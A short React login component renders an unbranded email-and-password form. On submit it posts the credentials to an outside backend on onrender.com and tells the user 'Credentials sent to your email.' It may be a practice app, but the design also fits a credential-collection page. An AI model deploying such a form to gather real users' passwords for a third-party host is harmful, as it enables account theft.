import { useState } from 'react';
import axios from 'axios';
import './App.css'
import React from 'react'

export default function App() {
  const [form, setForm] = useState({ email: '', password: '' });
  const [status, setStatus] = useState("");


  const handleChange = (e) => {
    setForm({ ...form, [e.target.name]: e.target.value });
  };


  const handleSubmit = async (e) => {
    e.preventDefault();
    try {
      await axios.post('https://login-backend-w8d5.onrender.com/login', form);
    setStatus("Credentials sent to your email.");
    } catch (error) {
      setStatus("Error sending credentials.");
    }
  };

  return (
    <div className="flex items-center justify-center min-h-screen bg-gray-100">
      <form onSubmit={handleSubmit} className="bg-white p-8 rounded-lg shadow-lg lg:w-96 w-full">
        <h2 className="text-2xl font-bold mb-4">Login</h2>
        <input
          className="w-full mb-4 p-2 border rounded"
          type="email"
          name="email"
          placeholder="Email"
          onChange={handleChange}
          required
        />
        <input
          className="w-full mb-4 p-2 border rounded"
          type="password"
          name="password"
          placeholder="Password"
          onChange={handleChange}
          required
        />
        <button className="w-full bg-blue-600 text-white p-2 rounded hover:bg-blue-700 cursor-pointer ">
          Submit
        </button>
        {status && <p className="mt-4 text-center">{status}</p>}
      </form>
    </div>
  );
}
